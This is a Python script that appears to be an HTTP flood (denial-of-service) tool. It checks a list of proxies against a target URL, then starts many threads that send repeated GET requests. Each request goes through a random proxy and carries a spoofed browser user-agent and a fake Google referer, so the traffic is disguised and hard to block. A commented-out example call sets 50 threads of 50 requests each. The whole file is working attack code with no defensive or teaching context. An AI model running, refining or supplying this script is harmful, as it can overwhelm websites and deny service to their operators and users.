import threading
import requests
import random
import time

def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [line.strip() for line in file.readlines() if line.strip()]
    return proxies

def load_user_agents(filename):
    with open(filename, 'r') as file:
        user_agents = [line.strip() for line in file.readlines() if line.strip()]
    return user_agents

def get_proxy_dict(proxy):
    if proxy.startswith("socks"):
        return {
            "http": f"socks5://{proxy[6:]}",  
            "https": f"socks5://{proxy[6:]}"
        }
    else:
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

def validate_proxies(url, proxies):
    valid_proxies = []
    for proxy in proxies:
        proxy_dict = get_proxy_dict(proxy)
        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            if response.status_code == 200:
                valid_proxies.append(proxy)
        except requests.exceptions.RequestException:
            continue
    return valid_proxies

def send_req_basic_v3(url, packet, proxies, user_agents, results):
    for _ in range(packet): 
        proxy = random.choice(proxies)
        user_agent = random.choice(user_agents)

        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': 'https://www.google.com',
            'Upgrade-Insecure-Requests': '1'
        }

        proxy_dict = get_proxy_dict(proxy)

        try:
            t = requests.get(url, headers=headers, proxies=proxy_dict, timeout=5)
            results.append(f"GET {url} VIA PROXY {proxy} STATUS CODE {t.status_code}")
        except requests.exceptions.ConnectTimeout:
            results.append(f"GET {url} VIA PROXY {proxy} CONNECTION TIMEOUT")
        except requests.exceptions.RequestException as e:
            results.append(f"GET {url} VIA PROXY {proxy} ERROR: {e}")

def run_threads_v3(url, packets, threads, proxies, user_agents, results):
    thread_list = []

    for _ in range(threads):
        thread = threading.Thread(target=send_req_basic_v3, args=(url, packets, proxies, user_agents, results))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def send_requests_with_proxies_and_ua_v3(url, packets, threads, proxy_file, ua_file, timeout=120):
    proxies = load_proxies(proxy_file)
    user_agents = load_user_agents(ua_file)

    valid_proxies = validate_proxies(url, proxies)

    results = []
    start_time = time.time()

    print(f"\nSending requests to {url} with {threads} threads and {packets} packets per thread using valid proxies and user-agents")
    
    run_threads_v3(url, packets, threads, valid_proxies, user_agents, results)

    elapsed_time = time.time() - start_time
    if elapsed_time < timeout:
        time.sleep(timeout - elapsed_time)

    for result in results:
        print(result)

# send_requests_with_proxies_and_ua_v3("http://example.com", packets=50, threads=50, proxy_file='proxies.txt', ua_file='user_agents.txt')
